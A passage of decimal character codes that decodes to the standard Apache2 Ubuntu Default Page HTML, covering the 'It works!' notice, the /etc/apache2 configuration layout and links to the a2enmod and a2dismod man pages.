111, 110, 115, 47, 117, 98, 117, 110, 116, 117, 45, 108, 111, 103, 111, 46, 112, 110, 103, 34, 32, 97, 108, 116, 61, 34, 85, 98, 117, 110, 116, 117, 32, 76, 111, 103, 111, 34, 32, 99, 108, 97, 115, 115, 61, 34, 102, 108, 111, 97, 116, 105, 110, 103, 95, 101, 108, 101, 109, 101, 110, 116, 34, 47, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 115, 112, 97, 110, 32, 99, 108, 97, 115, 115, 61, 34, 102, 108, 111, 97, 116, 105, 110, 103, 95, 101, 108, 101, 109, 101, 110, 116, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 65, 112, 97, 99, 104, 101, 50, 32, 85, 98, 117, 110, 116, 117, 32, 68, 101, 102, 97, 117, 108, 116, 32, 80, 97, 103, 101, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 115, 112, 97, 110, 62, 10, 32, 32, 32, 32, 32, 32, 60, 47, 100, 105, 118, 62, 10, 60, 33, 45, 45, 32, 32, 32, 32, 32, 32, 60, 100, 105, 118, 32, 99, 108, 97, 115, 115, 61, 34, 116, 97, 98, 108, 101, 95, 111, 102, 95, 99, 111, 110, 116, 101, 110, 116, 115, 32, 102, 108, 111, 97, 116, 105, 110, 103, 95, 101, 108, 101, 109, 101, 110, 116, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 100, 105, 118, 32, 99, 108, 97, 115, 115, 61, 34, 115, 101, 99, 116, 105, 111, 110, 95, 104, 101, 97, 100, 101, 114, 32, 115, 101, 99, 116, 105, 111, 110, 95, 104, 101, 97, 100, 101, 114, 95, 103, 114, 101, 121, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 84, 65, 66, 76, 69, 32, 79, 70, 32, 67, 79, 78, 84, 69, 78, 84, 83, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 100, 105, 118, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 100, 105, 118, 32, 99, 108, 97, 115, 115, 61, 34, 116, 97, 98, 108, 101, 95, 111, 102, 95, 99, 111, 110, 116, 101, 110, 116, 115, 95, 105, 116, 101, 109, 32, 102, 108, 111, 97, 116, 105, 110, 103, 95, 101, 108, 101, 109, 101, 110, 116, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 97, 32, 104, 114, 101, 102, 61, 34, 35, 97, 98, 111, 117, 116, 34, 62, 65, 98, 111, 117, 116, 60, 47, 97, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 100, 105, 118, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 100, 105, 118, 32, 99, 108, 97, 115, 115, 61, 34, 116, 97, 98, 108, 101, 95, 111, 102, 95, 99, 111, 110, 116, 101, 110, 116, 115, 95, 105, 116, 101, 109, 32, 102, 108, 111, 97, 116, 105, 110, 103, 95, 101, 108, 101, 109, 101, 110, 116, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 97, 32, 104, 114, 101, 102, 61, 34, 35, 99, 104, 97, 110, 103, 101, 115, 34, 62, 67, 104, 97, 110, 103, 101, 115, 60, 47, 97, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 100, 105, 118, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 100, 105, 118, 32, 99, 108, 97, 115, 115, 61, 34, 116, 97, 98, 108, 101, 95, 111, 102, 95, 99, 111, 110, 116, 101, 110, 116, 115, 95, 105, 116, 101, 109, 32, 102, 108, 111, 97, 116, 105, 110, 103, 95, 101, 108, 101, 109, 101, 110, 116, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 97, 32, 104, 114, 101, 102, 61, 34, 35, 115, 99, 111, 112, 101, 34, 62, 83, 99, 111, 112, 101, 60, 47, 97, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 100, 105, 118, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 100, 105, 118, 32, 99, 108, 97, 115, 115, 61, 34, 116, 97, 98, 108, 101, 95, 111, 102, 95, 99, 111, 110, 116, 101, 110, 116, 115, 95, 105, 116, 101, 109, 32, 102, 108, 111, 97, 116, 105, 110, 103, 95, 101, 108, 101, 109, 101, 110, 116, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 97, 32, 104, 114, 101, 102, 61, 34, 35, 102, 105, 108, 101, 115, 34, 62, 67, 111, 110, 102, 105, 103, 32, 102, 105, 108, 101, 115, 60, 47, 97, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 100, 105, 118, 62, 10, 32, 32, 32, 32, 32, 32, 60, 47, 100, 105, 118, 62, 10, 45, 45, 62, 10, 32, 32, 32, 32, 32, 32, 60, 100, 105, 118, 32, 99, 108, 97, 115, 115, 61, 34, 99, 111, 110, 116, 101, 110, 116, 95, 115, 101, 99, 116, 105, 111, 110, 32, 102, 108, 111, 97, 116, 105, 110, 103, 95, 101, 108, 101, 109, 101, 110, 116, 34, 62, 10, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 100, 105, 118, 32, 99, 108, 97, 115, 115, 61, 34, 115, 101, 99, 116, 105, 111, 110, 95, 104, 101, 97, 100, 101, 114, 32, 115, 101, 99, 116, 105, 111, 110, 95, 104, 101, 97, 100, 101, 114, 95, 114, 101, 100, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 100, 105, 118, 32, 105, 100, 61, 34, 97, 98, 111, 117, 116, 34, 62, 60, 47, 100, 105, 118, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 73, 116, 32, 119, 111, 114, 107, 115, 33, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 100, 105, 118, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 100, 105, 118, 32, 99, 108, 97, 115, 115, 61, 34, 99, 111, 110, 116, 101, 110, 116, 95, 115, 101, 99, 116, 105, 111, 110, 95, 116, 101, 120, 116, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 112, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 84, 104, 105, 115, 32, 105, 115, 32, 116, 104, 101, 32, 100, 101, 102, 97, 117, 108, 116, 32, 119, 101, 108, 99, 111, 109, 101, 32, 112, 97, 103, 101, 32, 117, 115, 101, 100, 32, 116, 111, 32, 116, 101, 115, 116, 32, 116, 104, 101, 32, 99, 111, 114, 114, 101, 99, 116, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 111, 112, 101, 114, 97, 116, 105, 111, 110, 32, 111, 102, 32, 116, 104, 101, 32, 65, 112, 97, 99, 104, 101, 50, 32, 115, 101, 114, 118, 101, 114, 32, 97, 102, 116, 101, 114, 32, 105, 110, 115, 116, 97, 108, 108, 97, 116, 105, 111, 110, 32, 111, 110, 32, 85, 98, 117, 110, 116, 117, 32, 115, 121, 115, 116, 101, 109, 115, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 73, 116, 32, 105, 115, 32, 98, 97, 115, 101, 100, 32, 111, 110, 32, 116, 104, 101, 32, 101, 113, 117, 105, 118, 97, 108, 101, 110, 116, 32, 112, 97, 103, 101, 32, 111, 110, 32, 68, 101, 98, 105, 97, 110, 44, 32, 102, 114, 111, 109, 32, 119, 104, 105, 99, 104, 32, 116, 104, 101, 32, 85, 98, 117, 110, 116, 117, 32, 65, 112, 97, 99, 104, 101, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 112, 97, 99, 107, 97, 103, 105, 110, 103, 32, 105, 115, 32, 100, 101, 114, 105, 118, 101, 100, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 73, 102, 32, 121, 111, 117, 32, 99, 97, 110, 32, 114, 101, 97, 100, 32, 116, 104, 105, 115, 32, 112, 97, 103, 101, 44, 32, 105, 116, 32, 109, 101, 97, 110, 115, 32, 116, 104, 97, 116, 32, 116, 104, 101, 32, 65, 112, 97, 99, 104, 101, 32, 72, 84, 84, 80, 32, 115, 101, 114, 118, 101, 114, 32, 105, 110, 115, 116, 97, 108, 108, 101, 100, 32, 97, 116, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 116, 104, 105, 115, 32, 115, 105, 116, 101, 32, 105, 115, 32, 119, 111, 114, 107, 105, 110, 103, 32, 112, 114, 111, 112, 101, 114, 108, 121, 46, 32, 89, 111, 117, 32, 115, 104, 111, 117, 108, 100, 32, 60, 98, 62, 114, 101, 112, 108, 97, 99, 101, 32, 116, 104, 105, 115, 32, 102, 105, 108, 101, 60, 47, 98, 62, 32, 40, 108, 111, 99, 97, 116, 101, 100, 32, 97, 116, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 116, 116, 62, 47, 118, 97, 114, 47, 119, 119, 119, 47, 104, 116, 109, 108, 47, 105, 110, 100, 101, 120, 46, 104, 116, 109, 108, 60, 47, 116, 116, 62, 41, 32, 98, 101, 102, 111, 114, 101, 32, 99, 111, 110, 116, 105, 110, 117, 105, 110, 103, 32, 116, 111, 32, 111, 112, 101, 114, 97, 116, 101, 32, 121, 111, 117, 114, 32, 72, 84, 84, 80, 32, 115, 101, 114, 118, 101, 114, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 112, 62, 10, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 112, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 73, 102, 32, 121, 111, 117, 32, 97, 114, 101, 32, 97, 32, 110, 111, 114, 109, 97, 108, 32, 117, 115, 101, 114, 32, 111, 102, 32, 116, 104, 105, 115, 32, 119, 101, 98, 32, 115, 105, 116, 101, 32, 97, 110, 100, 32, 100, 111, 110, 39, 116, 32, 107, 110, 111, 119, 32, 119, 104, 97, 116, 32, 116, 104, 105, 115, 32, 112, 97, 103, 101, 32, 105, 115, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 97, 98, 111, 117, 116, 44, 32, 116, 104, 105, 115, 32, 112, 114, 111, 98, 97, 98, 108, 121, 32, 109, 101, 97, 110, 115, 32, 116, 104, 97, 116, 32, 116, 104, 101, 32, 115, 105, 116, 101, 32, 105, 115, 32, 99, 117, 114, 114, 101, 110, 116, 108, 121, 32, 117, 110, 97, 118, 97, 105, 108, 97, 98, 108, 101, 32, 100, 117, 101, 32, 116, 111, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 109, 97, 105, 110, 116, 101, 110, 97, 110, 99, 101, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 73, 102, 32, 116, 104, 101, 32, 112, 114, 111, 98, 108, 101, 109, 32, 112, 101, 114, 115, 105, 115, 116, 115, 44, 32, 112, 108, 101, 97, 115, 101, 32, 99, 111, 110, 116, 97, 99, 116, 32, 116, 104, 101, 32, 115, 105, 116, 101, 39, 115, 32, 97, 100, 109, 105, 110, 105, 115, 116, 114, 97, 116, 111, 114, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 112, 62, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 100, 105, 118, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 100, 105, 118, 32, 99, 108, 97, 115, 115, 61, 34, 115, 101, 99, 116, 105, 111, 110, 95, 104, 101, 97, 100, 101, 114, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 100, 105, 118, 32, 105, 100, 61, 34, 99, 104, 97, 110, 103, 101, 115, 34, 62, 60, 47, 100, 105, 118, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 67, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 32, 79, 118, 101, 114, 118, 105, 101, 119, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 100, 105, 118, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 100, 105, 118, 32, 99, 108, 97, 115, 115, 61, 34, 99, 111, 110, 116, 101, 110, 116, 95, 115, 101, 99, 116, 105, 111, 110, 95, 116, 101, 120, 116, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 112, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 85, 98, 117, 110, 116, 117, 39, 115, 32, 65, 112, 97, 99, 104, 101, 50, 32, 100, 101, 102, 97, 117, 108, 116, 32, 99, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 32, 105, 115, 32, 100, 105, 102, 102, 101, 114, 101, 110, 116, 32, 102, 114, 111, 109, 32, 116, 104, 101, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 117, 112, 115, 116, 114, 101, 97, 109, 32, 100, 101, 102, 97, 117, 108, 116, 32, 99, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 44, 32, 97, 110, 100, 32, 115, 112, 108, 105, 116, 32, 105, 110, 116, 111, 32, 115, 101, 118, 101, 114, 97, 108, 32, 102, 105, 108, 101, 115, 32, 111, 112, 116, 105, 109, 105, 122, 101, 100, 32, 102, 111, 114, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 105, 110, 116, 101, 114, 97, 99, 116, 105, 111, 110, 32, 119, 105, 116, 104, 32, 85, 98, 117, 110, 116, 117, 32, 116, 111, 111, 108, 115, 46, 32, 84, 104, 101, 32, 99, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 32, 115, 121, 115, 116, 101, 109, 32, 105, 115, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 98, 62, 102, 117, 108, 108, 121, 32, 100, 111, 99, 117, 109, 101, 110, 116, 101, 100, 32, 105, 110, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 47, 117, 115, 114, 47, 115, 104, 97, 114, 101, 47, 100, 111, 99, 47, 97, 112, 97, 99, 104, 101, 50, 47, 82, 69, 65, 68, 77, 69, 46, 68, 101, 98, 105, 97, 110, 46, 103, 122, 60, 47, 98, 62, 46, 32, 82, 101, 102, 101, 114, 32, 116, 111, 32, 116, 104, 105, 115, 32, 102, 111, 114, 32, 116, 104, 101, 32, 102, 117, 108, 108, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 100, 111, 99, 117, 109, 101, 110, 116, 97, 116, 105, 111, 110, 46, 32, 68, 111, 99, 117, 109, 101, 110, 116, 97, 116, 105, 111, 110, 32, 102, 111, 114, 32, 116, 104, 101, 32, 119, 101, 98, 32, 115, 101, 114, 118, 101, 114, 32, 105, 116, 115, 101, 108, 102, 32, 99, 97, 110, 32, 98, 101, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 102, 111, 117, 110, 100, 32, 98, 121, 32, 97, 99, 99, 101, 115, 115, 105, 110, 103, 32, 116, 104, 101, 32, 60, 97, 32, 104, 114, 101, 102, 61, 34, 47, 109, 97, 110, 117, 97, 108, 34, 62, 109, 97, 110, 117, 97, 108, 60, 47, 97, 62, 32, 105, 102, 32, 116, 104, 101, 32, 60, 116, 116, 62, 97, 112, 97, 99, 104, 101, 50, 45, 100, 111, 99, 60, 47, 116, 116, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 112, 97, 99, 107, 97, 103, 101, 32, 119, 97, 115, 32, 105, 110, 115, 116, 97, 108, 108, 101, 100, 32, 111, 110, 32, 116, 104, 105, 115, 32, 115, 101, 114, 118, 101, 114, 46, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 112, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 112, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 84, 104, 101, 32, 99, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 32, 108, 97, 121, 111, 117, 116, 32, 102, 111, 114, 32, 97, 110, 32, 65, 112, 97, 99, 104, 101, 50, 32, 119, 101, 98, 32, 115, 101, 114, 118, 101, 114, 32, 105, 110, 115, 116, 97, 108, 108, 97, 116, 105, 111, 110, 32, 111, 110, 32, 85, 98, 117, 110, 116, 117, 32, 115, 121, 115, 116, 101, 109, 115, 32, 105, 115, 32, 97, 115, 32, 102, 111, 108, 108, 111, 119, 115, 58, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 112, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 112, 114, 101, 62, 10, 47, 101, 116, 99, 47, 97, 112, 97, 99, 104, 101, 50, 47, 10, 124, 45, 45, 32, 97, 112, 97, 99, 104, 101, 50, 46, 99, 111, 110, 102, 10, 124, 32, 32, 32, 32, 32, 32, 32, 96, 45, 45, 32, 32, 112, 111, 114, 116, 115, 46, 99, 111, 110, 102, 10, 124, 45, 45, 32, 109, 111, 100, 115, 45, 101, 110, 97, 98, 108, 101, 100, 10, 124, 32, 32, 32, 32, 32, 32, 32, 124, 45, 45, 32, 42, 46, 108, 111, 97, 100, 10, 124, 32, 32, 32, 32, 32, 32, 32, 96, 45, 45, 32, 42, 46, 99, 111, 110, 102, 10, 124, 45, 45, 32, 99, 111, 110, 102, 45, 101, 110, 97, 98, 108, 101, 100, 10, 124, 32, 32, 32, 32, 32, 32, 32, 96, 45, 45, 32, 42, 46, 99, 111, 110, 102, 10, 124, 45, 45, 32, 115, 105, 116, 101, 115, 45, 101, 110, 97, 98, 108, 101, 100, 10, 124, 32, 32, 32, 32, 32, 32, 32, 96, 45, 45, 32, 42, 46, 99, 111, 110, 102, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 112, 114, 101, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 117, 108, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 108, 105, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 116, 116, 62, 97, 112, 97, 99, 104, 101, 50, 46, 99, 111, 110, 102, 60, 47, 116, 116, 62, 32, 105, 115, 32, 116, 104, 101, 32, 109, 97, 105, 110, 32, 99, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 102, 105, 108, 101, 46, 32, 73, 116, 32, 112, 117, 116, 115, 32, 116, 104, 101, 32, 112, 105, 101, 99, 101, 115, 32, 116, 111, 103, 101, 116, 104, 101, 114, 32, 98, 121, 32, 105, 110, 99, 108, 117, 100, 105, 110, 103, 32, 97, 108, 108, 32, 114, 101, 109, 97, 105, 110, 105, 110, 103, 32, 99, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 102, 105, 108, 101, 115, 32, 119, 104, 101, 110, 32, 115, 116, 97, 114, 116, 105, 110, 103, 32, 117, 112, 32, 116, 104, 101, 32, 119, 101, 98, 32, 115, 101, 114, 118, 101, 114, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 108, 105, 62, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 108, 105, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 116, 116, 62, 112, 111, 114, 116, 115, 46, 99, 111, 110, 102, 60, 47, 116, 116, 62, 32, 105, 115, 32, 97, 108, 119, 97, 121, 115, 32, 105, 110, 99, 108, 117, 100, 101, 100, 32, 102, 114, 111, 109, 32, 116, 104, 101, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 109, 97, 105, 110, 32, 99, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 32, 102, 105, 108, 101, 46, 32, 73, 116, 32, 105, 115, 32, 117, 115, 101, 100, 32, 116, 111, 32, 100, 101, 116, 101, 114, 109, 105, 110, 101, 32, 116, 104, 101, 32, 108, 105, 115, 116, 101, 110, 105, 110, 103, 32, 112, 111, 114, 116, 115, 32, 102, 111, 114, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 105, 110, 99, 111, 109, 105, 110, 103, 32, 99, 111, 110, 110, 101, 99, 116, 105, 111, 110, 115, 44, 32, 97, 110, 100, 32, 116, 104, 105, 115, 32, 102, 105, 108, 101, 32, 99, 97, 110, 32, 98, 101, 32, 99, 117, 115, 116, 111, 109, 105, 122, 101, 100, 32, 97, 110, 121, 116, 105, 109, 101, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 108, 105, 62, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 108, 105, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 67, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 32, 102, 105, 108, 101, 115, 32, 105, 110, 32, 116, 104, 101, 32, 60, 116, 116, 62, 109, 111, 100, 115, 45, 101, 110, 97, 98, 108, 101, 100, 47, 60, 47, 116, 116, 62, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 116, 116, 62, 99, 111, 110, 102, 45, 101, 110, 97, 98, 108, 101, 100, 47, 60, 47, 116, 116, 62, 32, 97, 110, 100, 32, 60, 116, 116, 62, 115, 105, 116, 101, 115, 45, 101, 110, 97, 98, 108, 101, 100, 47, 60, 47, 116, 116, 62, 32, 100, 105, 114, 101, 99, 116, 111, 114, 105, 101, 115, 32, 99, 111, 110, 116, 97, 105, 110, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 112, 97, 114, 116, 105, 99, 117, 108, 97, 114, 32, 99, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 32, 115, 110, 105, 112, 112, 101, 116, 115, 32, 119, 104, 105, 99, 104, 32, 109, 97, 110, 97, 103, 101, 32, 109, 111, 100, 117, 108, 101, 115, 44, 32, 103, 108, 111, 98, 97, 108, 32, 99, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 102, 114, 97, 103, 109, 101, 110, 116, 115, 44, 32, 111, 114, 32, 118, 105, 114, 116, 117, 97, 108, 32, 104, 111, 115, 116, 32, 99, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 115, 44, 32, 114, 101, 115, 112, 101, 99, 116, 105, 118, 101, 108, 121, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 108, 105, 62, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 108, 105, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 84, 104, 101, 121, 32, 97, 114, 101, 32, 97, 99, 116, 105, 118, 97, 116, 101, 100, 32, 98, 121, 32, 115, 121, 109, 108, 105, 110, 107, 105, 110, 103, 32, 97, 118, 97, 105, 108, 97, 98, 108, 101, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 99, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 32, 102, 105, 108, 101, 115, 32, 102, 114, 111, 109, 32, 116, 104, 101, 105, 114, 32, 114, 101, 115, 112, 101, 99, 116, 105, 118, 101, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 42, 45, 97, 118, 97, 105, 108, 97, 98, 108, 101, 47, 32, 99, 111, 117, 110, 116, 101, 114, 112, 97, 114, 116, 115, 46, 32, 84, 104, 101, 115, 101, 32, 115, 104, 111, 117, 108, 100, 32, 98, 101, 32, 109, 97, 110, 97, 103, 101, 100, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 98, 121, 32, 117, 115, 105, 110, 103, 32, 111, 117, 114, 32, 104, 101, 108, 112, 101, 114, 115, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 116, 116, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 97, 32, 104, 114, 101, 102, 61, 34, 104, 116, 116, 112, 58, 47, 47, 109, 97, 110, 112, 97, 103, 101, 115, 46, 100, 101, 98, 105, 97, 110, 46, 111, 114, 103, 47, 99, 103, 105, 45, 98, 105, 110, 47, 109, 97, 110, 46, 99, 103, 105, 63, 113, 117, 101, 114, 121, 61, 97, 50, 101, 110, 109, 111, 100, 34, 62, 97, 50, 101, 110, 109, 111, 100, 60, 47, 97, 62, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 97, 32, 104, 114, 101, 102, 61, 34, 104, 116, 116, 112, 58, 47, 47, 109, 97, 110, 112, 97, 103, 101, 115, 46, 100, 101, 98, 105, 97, 110, 46, 111, 114, 103, 47, 99, 103, 105, 45, 98, 105, 110, 47, 109, 97, 110, 46, 99, 103, 105, 63, 113, 117, 101, 114, 121, 61, 97, 50, 100, 105, 115, 109, 111, 100, 34, 62, 97, 50, 100, 105, 115, 109, 111, 100, 60, 47, 97, 62, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 47, 116, 116, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 116, 116, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 97, 32, 104, 114, 101, 102, 61, 34, 104, 116, 116, 112, 58, 47, 47, 109, 97, 110, 112, 97, 103, 101, 115, 46, 100, 101, 98, 105, 97, 110, 46, 111, 114, 103, 47, 99, 103, 105, 45, 98, 105, 110, 47, 109, 97, 110, 46, 99, 103, 105, 63, 113, 117, 101, 114, 121, 61, 97, 50, 101, 110, 115, 105, 116, 101, 34, 62, 97, 50, 101, 110, 115, 105, 116, 101, 60, 47, 97, 62, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 60, 97, 32, 104, 114, 101, 102, 61, 34, 104, 116, 116, 112, 58, 47, 47, 109, 97, 110, 112, 97, 103, 101, 115, 46, 100, 101, 98, 105, 97, 110, 46, 111, 114, 103, 